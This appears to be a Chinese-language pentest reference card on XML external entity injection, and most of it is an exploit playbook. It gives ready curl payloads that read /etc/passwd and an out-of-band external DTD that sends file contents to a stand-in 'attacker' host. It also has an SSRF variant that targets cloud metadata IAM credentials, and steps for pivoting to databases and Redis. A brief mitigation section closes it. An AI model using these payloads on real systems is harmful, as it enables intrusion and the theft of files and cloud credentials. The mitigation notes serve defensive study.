---
title: XXE 外部实体注入（读文件 / SSRF / OOB 外带）
cve: 无（实现缺陷）
severity: high
cvss: 8.2
product: 任何解析 XML 的接口（SOAP、上传 DOCX/SVG、SAML）
versions: 任意
ports: 80, 443
keywords: xxe, xml, 外部实体, 文件读取, oob, saml
entry: Content-Type: application/xml 的接口
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 接口接受 XML（`Content-Type: application/xml` 或 `text/xml`）；
- 上传 DOCX/XLSX/SVG 后服务端解析（转换、预览）。

## 前置条件

- 目标用默认配置的 XML 解析器（未禁 DTD/外部实体）。

## PoC

```bash
# 1) 基础：读 /etc/passwd
curl -s -X POST 'https://target/api/import' -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r><name>&x;</name></r>
XML
# 判定：回显 root:x:0:0 = 命中
```

```bash
# 2) 无回显时 OOB 外带（参数实体 + 外部 DTD）
# attacker 上放 evil.dtd：
#   <!ENTITY % f SYSTEM "file:///etc/passwd">
#   <!ENTITY % p "<!ENTITY send SYSTEM 'http://attacker/?d=%f;'>">
cat > /tmp/xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/evil.dtd"> %d;]>
<r>&send;</r>
XML
curl -s -X POST 'https://target/api/import' -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml
# 判定：attacker 收到带内容的请求 = 命中
```

```bash
# 3) SSRF 变体：读云元数据
# <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

## 利用步骤

1. 先找 XML 入口（API/上传/SAML）；
2. 回显优先，无回显用 OOB（外部 DTD）；
3. 读到配置后转数据库/Redis 条目；
4. 证据：响应片段或 attacker 日志。

## 修复与缓解

- 解析器禁 DTD 与外部实体（`disallow-doctype-decl=true`）；
- 上传的 DOCX/SVG 用安全解析库，限大小。

## 参考

- OWASP XXE 防护速查；CWE-611。
